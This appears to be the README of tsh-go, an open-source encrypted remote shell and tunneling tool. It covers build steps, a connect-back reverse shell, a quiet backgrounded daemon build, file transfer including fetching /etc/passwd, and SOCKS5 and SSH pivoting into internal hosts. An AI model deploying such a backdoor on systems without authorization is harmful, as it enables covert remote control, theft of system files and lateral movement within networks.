# tsh-go

`tsh-go` is a small encrypted remote shell and tunneling tool inspired by [Tiny SHell](https://github.com/creaktive/tsh), implemented in Go, forked from [CykuTW/tsh-go](https://github.com/CykuTW/tsh-go).

It builds a single CLI with two roles:

- `tsh server`: listens for, or connects back to, a client.
- `tsh client`: opens a shell, runs a command, transfers files, starts a SOCKS5 proxy, or pipes stdio to a TCP target through the server.

## Disclaimer

This program is only for helping research or educational purpose,

**DO NOT** use for illegal purpose or in any unauthorized environment.

## Features

- Encrypted connection with pre-shared-secret
- Interactive PTY shell
- Non-TTY command execution for scripting
- Direct connection mode and connect-back mode
- File upload and download
- Local SOCKS5 proxy through the server
- Stdio-to-TCP pipe mode like `nc -N`
- Can be cross-compiled to multiple platforms thanks to the Go toolchain
- Faster connection establishment speed over SSH

## Build

Requirements:

- Go 1.23 or newer
- `make` for the provided build targets

Show available targets:

```sh
make
```

Build Linux amd64 binaries:

```sh
make linux
```

Build Windows amd64 binaries:

```sh
make windows
```

Build another Unix-like target supported by Go:

```sh
GOOS=freebsd GOARCH=386 make unix
```

The Makefile creates two binaries from the same `main.go`:

- `build/tsh_<goos>_<goarch>`: normal CLI. Run commands such as `tsh c ...` and `tsh s ...`.
- `build/tshd_<goos>_<goarch>`: server-oriented build with embedded default arguments. By default, running it with no arguments behaves like `tsh s -d -q`.

The default embedded secret is generated in `cmd/secret.txt`. To generate a new default secret before building:

```sh
make clean-secret
make linux
```

You can also override the default no-argument behavior of `tshd_*` builds:

```sh
TSHD_DEFAULT_ARGS='s -d -q -c 127.0.0.1 -p 7890 -s secret' make linux
```

## Command Overview

```sh
Usage:
  tsh s [-d] [-q] [-s secret] [-p port] [-c cb-host] [--delay n]
  tsh c -c <host|cb> [-s secret] [-p port] [command]
  tsh c -c <host|cb> get <src> <dst>
  tsh c -c <host|cb> put <src> <dst>
  tsh c -c <host|cb> socks5 <addr>
  tsh c -c <host|cb> pipe <addr>
  tsh c -c <host|cb> kill

Options:
  -c  target host; use "cb" on the client for connect-back mode
  -p  port, default 2413
  -s  pre-shared secret
  -q  quiet mode
  -d  run server in background
```

## Direct Mode

In direct mode, the server listens and the client connects to it.

Start the server:

```sh
tsh s
```

Open an interactive shell:

```sh
tsh c -c target
```

Run a single command:

```sh
tsh c -c target 'uname -a'
```

Like SSH, the client requests a PTY by default for an interactive shell, but
does not request one when a command is provided. To force TTY mode, simply add `-t`:

```sh
tsh c -c target -t htop
```

## Connect-Back Mode

Connect-back mode reverses the TCP connection. The client listens, and the
server repeatedly connects back to the client.

Start the client listener:

```sh
tsh c -c cb
```

Start the server in connect-back mode:

```sh
tsh s -c client
```

Port flag means the port to conenct:

```
tsh s -c client -p 2413
```

Set the retry delay in seconds:

```sh
tsh s -c client --delay 3
```

Run the server in the background (and supress outputs):

```sh
tsh s -d -q
```

Stop a running server through the protocol:

```sh
tsh c -c target kill
```

## File Transfer

`get` and `put` work like `cp`: if the destination is a directory, the file is copied into it using its basename. Use `-` for stdin/stdout.

```sh
# remote -> local
tsh c -c target get /etc/passwd ./passwd
tsh c -c target get /etc/hostname -

# local -> remote
tsh c -c target put ./tool /tmp/target
tsh c -c target put ./tool /tmp/
printf 'hello\n' | tsh c -c target put - /tmp/hello.txt
```

## SOCKS5 Proxy

Start a local SOCKS5 proxy whose outbound connections are made from the server:

```sh
tsh c -c target socks5 localhost:9050
```

Then point SOCKS5-capable tools at `localhost:9050`.

SOCKS5 mode multiplexes connections over a single encrypted session. It is most
useful in direct mode; connect-back mode works, but the command has to wait for
the server to establish the reverse connection.

## Pipe Mode

Pipe mode connects the client's stdin/stdout to a TCP target as seen from the
server. Like `nc -N` does.

```sh
tsh c -c target pipe internal-host:22
```

One practical use is SSH proxying:

```sh
ssh -o ProxyCommand='tsh c -c target pipe %h:%p' user@internal-host
```

## TSH over proxy

Outbound client and server dials use Go's proxy environment support. Environment
variables such as `ALL_PROXY` and `NO_PROXY` are honored for TCP dials.

## Development

Run tests:

```sh
go test -v ./...
```
